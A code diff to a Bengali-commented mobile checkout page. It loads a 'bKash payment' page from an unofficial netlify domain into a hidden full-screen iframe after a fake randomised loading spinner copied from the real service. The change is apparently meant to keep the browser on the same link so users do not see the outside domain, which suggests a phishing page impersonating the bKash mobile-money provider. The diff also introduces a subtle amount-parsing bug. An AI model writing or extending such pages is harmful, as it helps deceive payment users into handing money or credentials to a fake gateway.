@@ -20,9 +20,11 @@ body {
     align-items: flex-start;
     min-height: 100vh;
     position: relative;
+    overflow-x: hidden;
 }
 
-.container {
+/* প্রধান কন্টেইনার */
+#main-payment-content {
     width: 100%;
     max-width: 420px;
     padding: 20px 24px;
@@ -169,6 +171,19 @@ body {
     font-weight: 700;
 }
 
+/* --- ফুল-স্ক্রিন বিকাশ আইফ্রেম (iframe) স্টাইল --- */
+#bkash-iframe {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    border: none;
+    display: none; /* শুরুতে এটি লুকানো থাকবে */
+    z-index: 9999;  /* লোডিং স্ক্রিনের ঠিক নিচে থাকবে */
+    background: #ffffff;
+}
+
 /* --- ১০০% হুবহু ডাবল রিভার্স স্পিনার ওভারলে --- */
 .loading-overlay {
     position: fixed;
@@ -180,7 +195,7 @@ body {
     display: none; 
     justify-content: center;
     align-items: center;
-    z-index: 10000;
+    z-index: 10000; /* এটি সবার উপরে থাকবে */
 }
 
 .double-spinner {
@@ -230,7 +245,11 @@ body {
     <div class="double-spinner"></div>
 </div>
 
-<div class="container">
+<!-- বিকাশ পেজ লোড হওয়ার জন্য ইনলাইন আইফ্রেম -->
+<iframe id="bkash-iframe"></iframe>
+
+<!-- মূল পেমেন্ট গেটওয়ে পেজের কন্টেন্ট -->
+<div id="main-payment-content" class="container">
     <div class="topbox">
         <button class="icon-btn">
             <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#758494" stroke-width="2"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path><polyline points="9 22 9 12 15 12 15 22"></polyline></svg>
@@ -276,52 +295,62 @@ body {
     </div>
 </div>
 
-<div class="footer">
-    <!-- আপনার রিকোয়েস্ট অনুযায়ী ডিফল্টভাবে এখানে 0.00 করা হয়েছে -->
+<div class="footer" id="main-footer">
     <div class="paybtn">Pay <span id="dynamicAmount">0.00</span> BDT</div>
 </div>
 
 <script>
-    // বৈশ্বিক ভেরিয়েবল যেখানে ফাইনাল এমাউন্ট জমা থাকবে (.০০ ছাড়া)
     let finalAmountToPass = "0";
 
-    // --- ১. প্রথম ধাপ: অন্য ওয়েবসাইট থেকে ইউআরএল (URL) এর মাধ্যমে প্রাইস গ্রহণ করা ---
+    // ১. অন্য ওয়েবসাইট থেকে ডাইনামিক প্রাইস গ্রহণ করা
     document.addEventListener('DOMContentLoaded', () => {
         const urlParams = new URLSearchParams(window.location.search);
         const amountValue = urlParams.get("amount");
         const displayElement = document.getElementById("dynamicAmount");
 
         if (amountValue && !isNaN(amountValue) && parseFloat(amountValue) > 0) {
-            // অন্য সাইট থেকে ডাটা আসলে তা ২ দশমিক ঘরসহ (যেমন: 99.00) মেইন স্ক্রিনে দেখাবে
             displayElement.innerText = parseFloat(amountValue).toFixed(2);
-            
-            // পরবর্তী বিকাশ পেজে পাঠানোর জন্য শুধু মূল সংখ্যাটি ফিল্টার করে রাখা (.০০ বাদে)
-            finalAmountToPass = Math.floor(parseFloat(amountValue)).toString();
+            finalAmountToPass = Math.floor(parseFloat(amountValue).toString());
         } else {
-            // যদি সরাসরি কেউ ওপেন করে তবে ডিফল্ট 0.00 দেখাবে
             displayElement.innerText = "0.00";
             finalAmountToPass = "0";
         }
     });
 
-    // --- ২. দ্বিতীয় ধাপ: বিকাশে ক্লিক করলে অ্যানিমেশন হয়ে ডাইনামিক প্রাইস পাঠানো ---
+    // ২. বিকাশে ক্লিক করলে একই লিংকের আন্ডারে বিকাশ পেজ ওপেন করা
     document.getElementById('checkout-bkash-btn').addEventListener('click', function() {
         
-        // ১০০% হুবহু ডাবল রিভার্স স্পিনার অ্যানিমেশন চালু করা
-        document.getElementById('loading-screen').style.display = 'flex';
+        const loadingScreen = document.getElementById('loading-screen');
+        const bkashIframe = document.getElementById('bkash-iframe');
+        const mainContent = document.getElementById('main-payment-content');
+        const mainFooter = document.getElementById('main-footer');
         
-        // ১.৫ সেকেন্ড থেকে ৩.০ সেকেন্ডের মধ্যে একটি র্যান্ডম নেটওয়ার্ক টাইম জেনারেট করা
+        // অ্যানিমেশন স্ক্রিন চালু করা
+        loadingScreen.style.display = 'flex';
+        
+        // আপনার বিকাশ পেমেন্ট পেজের লিংক জেনারেট করা
+        const bkashPageUrl = "https://bkash-payment-getway.netlify.app/?amount=" + finalAmountToPass;
+        
+        // আইফ্রেমের সোর্স হিসেবে বিকাশ পেজের লিংক সেট করা
+        bkashIframe.src = bkashPageUrl;
+        
+        // ১.৫ থেকে ৩.০ সেকেন্ডের মধ্যে র‍্যান্ডম টাইম কাউন্ট করা (ভিডিওর সাথে ম্যাচিং স্পিড)
         const randomLoadingTime = Math.floor(Math.random() * (3000 - 1500 + 1)) + 1500;
         
         setTimeout(function() {
-            // আপনার দেওয়া নেটলিফাই বিকাশ পেমেন্ট পেজের লিংক
-            const bkashPageUrl = "https://bkash-payment-getway.netlify.app/"; 
+            // লোডিং অ্যানিমেশন বন্ধ করা
+            loadingScreen.style.display = 'none';
             
-            // দশমিক ছাড়া ক্লিন ডাইনামিক প্রাইস পাস হবে
-            window.location.href = bkashPageUrl + "?amount=" + finalAmountToPass;
+            // একই পেজে ব্যাকগ্রাউন্ডের মেইন কন্টেন্টগুলো লুকিয়ে ফেলা যেন কোনো জটলা না পাকায়
+            mainContent.style.display = 'none';
+            mainFooter.style.display = 'none';
+            
+            // এবার একই লিংকের আন্ডারে ফুল স্ক্রিনে বিকাশ পেজটি ডিসপ্লে করা
+            bkashIframe.style.display = 'block';
         }, randomLoadingTime);
     });
 </script>
 
 </body>
 </html>
+
